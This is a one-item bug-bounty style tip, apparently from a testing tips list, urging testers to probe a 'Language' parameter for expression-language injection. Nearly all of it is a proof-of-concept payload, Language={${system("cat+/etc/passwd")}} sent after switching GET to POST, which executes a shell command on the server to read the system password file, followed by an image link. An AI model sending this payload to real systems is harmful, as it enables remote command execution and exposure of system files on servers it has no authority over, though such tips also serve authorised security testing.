### 1)If You Ever See Language Parameter, Then Never Forget to Test Expression-Language Injection Style Payload.
✅POC Payload:
```
1. Change the Method GET to POST
2. Language={${system("cat+/etc/passwd")}}
```
![G5iE0OraIAAKfZl](https://github.com/user-attachments/assets/f17da3d5-7497-45b6-9b73-fd85e68523bb)
